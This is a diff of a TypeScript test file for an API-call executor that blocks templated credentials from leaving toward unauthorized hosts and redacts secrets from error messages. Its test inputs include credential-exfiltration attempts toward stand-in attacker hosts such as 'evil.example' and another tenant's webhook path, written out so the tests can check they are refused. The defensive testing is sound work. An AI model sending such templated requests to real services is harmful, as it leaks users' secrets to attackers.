@@ -1608,114 +1608,143 @@ describe("executeApiCall — redirects after the credential-exfiltration downgra
 });
 
 describe("executeApiCall — credential exfiltration with URL-valued credential fields", () => {
-  /** Webhooks-like: allow_all_uris, no allowlist, the endpoint is itself a credential field. */
-  const webhookCreds = () =>
+  const VICTIM_HOOK = "https://hooks.example.com/services/TVICTIM/x";
+  const fieldCreds = (policy: { authorizedUris: string[] | null; allowAllUris: boolean }) =>
     mock(async (): Promise<CredentialsResponse> => ({
-      credentials: {
-        webhook_url: "https://hooks.example.com/x/y",
-        site_url: "https://site.example.com",
-        secret_header_value: "S",
-        api_key: "SECRET",
-      },
-      authorizedUris: null,
-      allowAllUris: true,
+      credentials: { webhook_url: VICTIM_HOOK, secret_header_value: "S", api_key: "SECRET" },
+      ...policy,
       credentialFieldName: "api_key",
     }));
 
-  /** Records every outbound URL; `hooks.example.com` answers `hookResponse()`. */
-  function recordingFetch(hookResponse = () => new Response("ok", { status: 200 })) {
-    const calls: { url: string; init: RequestInit & { headers: Record<string, string> } }[] = [];
-    const fetchFn = mock(async (url: string | URL, init?: RequestInit) => {
-      const u = typeof url === "string" ? url : url.toString();
-      calls.push({ url: u, init: init as RequestInit & { headers: Record<string, string> } });
-      return u.startsWith("https://hooks.example.com") ? hookResponse() : new Response("ok");
+  function recordingFetch() {
+    const calls: string[] = [];
+    const fetchFn = mock(async (url: string | URL) => {
+      calls.push(String(url));
+      return new Response("ok");
     });
     return { fetchFn: fetchFn as unknown as typeof fetch, calls };
   }
 
-  const call = (
-    fetchFn: typeof fetch,
-    targetUrl: string,
-    extra: Partial<Parameters<typeof executeApiCall>[0]> = {},
-  ) =>
-    executeApiCall(
-      {
-        integrationId: "demo",
-        targetUrl,
-        method: "POST",
-        callerHeaders: { "X-Secret": "{{secret_header_value}}" },
-        body: { kind: "none" },
-        ...extra,
-      },
-      makeDeps({ fetchFn, fetchCredentials: webhookCreds() }),
-    );
-
-  it("reaches the connection's own endpoint with the templated secret", async () => {
-    const { fetchFn, calls } = recordingFetch();
-    const result = await call(fetchFn, "{{webhook_url}}");
-    expect(result.ok).toBe(true);
-    expect(calls.map((c) => c.url)).toEqual(["https://hooks.example.com/x/y"]);
-    expect(calls[0]!.init.headers["X-Secret"]).toBe("S");
-  });
-
-  it("refuses a redirect from the endpoint to another host", async () => {
-    const { fetchFn, calls } = recordingFetch(
-      () => new Response(null, { status: 302, headers: { location: "https://other.example/c" } }),
-    );
-    const result = await call(fetchFn, "{{webhook_url}}");
-    expect(result.ok).toBe(false);
-    if (!result.ok) {
-      expect(result.status).toBe(403);
-      expect(result.error).toMatch(/Redirect blocked \(unauthorized\)/);
-    }
-    expect(calls.map((c) => c.url)).toEqual(["https://hooks.example.com/x/y"]);
-  });
-
+  // A field's origin is often shared by tenants (hooks.slack.com): it must
+  // never make another endpoint on it a valid destination for the secret.
   it.each([
-    ["an agent-chosen host", "https://evil.example/?s={{secret_header_value}}"],
-    ["a `{{site_url}}@host` target resolving elsewhere", "{{site_url}}@evil.example/c"],
-  ])("refuses the templated secret toward %s", async (_, targetUrl) => {
-    const { fetchFn, calls } = recordingFetch();
-    const result = await call(fetchFn, targetUrl);
-    expect(result.ok).toBe(false);
-    if (!result.ok) {
-      expect(result.status).toBe(403);
-      expect(result.error).toMatch(/URL not authorized/);
-    }
-    expect(calls).toHaveLength(0);
-  });
+    [
+      "a JSON body carrying {{webhook_url}}",
+      { callerHeaders: {}, body: { kind: "json", value: { u: "{{webhook_url}}" } } },
+    ],
+    [
+      "a header carrying a secret",
+      { callerHeaders: { "X-Secret": "{{secret_header_value}}" }, body: { kind: "none" } },
+    ],
+  ] as const)(
+    "allow_all_uris, no allowlist: refuses %s to another tenant's hook on the field's origin",
+    async (_, req) => {
+      const { fetchFn, calls } = recordingFetch();
+      const result = await executeApiCall(
+        {
+          integrationId: "demo",
+          targetUrl: "https://hooks.example.com/services/TATTACKER/y",
+          method: "POST",
+          ...req,
+          substituteBody: true,
+        } as Parameters<typeof executeApiCall>[0],
+        makeDeps({
+          fetchFn,
+          fetchCredentials: fieldCreds({ authorizedUris: null, allowAllUris: true }),
+        }),
+      );
+      expect(result.ok).toBe(false);
+      if (!result.ok) expect(result.status).toBe(403);
+      expect(calls).toHaveLength(0);
+    },
+  );
 
-  it("detects a JSON-body leaf credential with whitespace inside the braces", async () => {
-    const { fetchFn, calls } = recordingFetch();
-    const result = await call(fetchFn, "https://evil.example/collect", {
-      callerHeaders: {},
-      body: { kind: "json", value: { k: "{{\tapi_key}}" } },
-      substituteBody: true,
-    });
-    expect(result.ok).toBe(false);
-    if (!result.ok) expect(result.status).toBe(403);
-    expect(calls).toHaveLength(0);
-  });
-
-  it("keeps the SSRF net on a field origin (it is not an operator host pin)", async () => {
+  it("declared allowlist: refuses a templated call to a URL-valued field outside it", async () => {
     const { fetchFn, calls } = recordingFetch();
     const result = await executeApiCall(
       {
         integrationId: "demo",
         targetUrl: "{{webhook_url}}",
         method: "POST",
-        callerHeaders: { "X-Secret": "{{secret_header_value}}" },
+        callerHeaders: {},
         body: { kind: "none" },
       },
       makeDeps({
         fetchFn,
-        fetchCredentials: webhookCreds(),
-        resolveHost: async () => ["10.0.0.5"],
+        fetchCredentials: fieldCreds({
+          authorizedUris: ["https://api.example.com/**"],
+          allowAllUris: false,
+        }),
+      }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(403);
+      expect(result.error).toMatch(/URL not authorized/);
+      expect(result.error).not.toContain("hooks.example.com");
+    }
+    expect(calls).toHaveLength(0);
+  });
+
+  it("detects a JSON-body leaf credential with whitespace inside the braces", async () => {
+    const { fetchFn, calls } = recordingFetch();
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        targetUrl: "https://evil.example/collect",
+        method: "POST",
+        callerHeaders: {},
+        body: { kind: "json", value: { k: "{{\tapi_key}}" } },
+        substituteBody: true,
+      },
+      makeDeps({
+        fetchFn,
+        fetchCredentials: fieldCreds({ authorizedUris: null, allowAllUris: true }),
       }),
     );
     expect(result.ok).toBe(false);
     if (!result.ok) expect(result.status).toBe(403);
     expect(calls).toHaveLength(0);
+  });
+});
+
+describe("executeApiCall — no credential in an error host", () => {
+  const SECRET = "AbCSecret9";
+  const globCreds = mock(async (): Promise<CredentialsResponse> => ({
+    credentials: { api_key: SECRET },
+    authorizedUris: ["https://*.api-us1.com/**"],
+    allowAllUris: false,
+    credentialFieldName: "api_key",
+  }));
+
+  it.each([
+    ["an unresolvable host", { resolveHost: async () => Promise.reject(new Error("ENOTFOUND")) }],
+    [
+      "a transport error",
+      {
+        fetchFn: mock(async () => {
+          throw Object.assign(new Error("connect failed"), { code: "ECONNREFUSED" });
+        }) as unknown as typeof fetch,
+      },
+    ],
+  ])("redacts a host-templated secret from %s", async (_, overrides) => {
+    const result = await executeApiCall(
+      {
+        integrationId: "demo",
+        targetUrl: "https://{{api_key}}.api-us1.com/v3/contacts",
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      makeDeps({ fetchCredentials: globCreds, ...overrides }),
+    );
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.status).toBe(502);
+      expect(result.error).toContain("{{api_key}}.api-us1.com");
+      expect(result.error).not.toContain(SECRET);
+      expect(result.error).not.toContain(SECRET.toLowerCase());
+    }
   });
 });
 
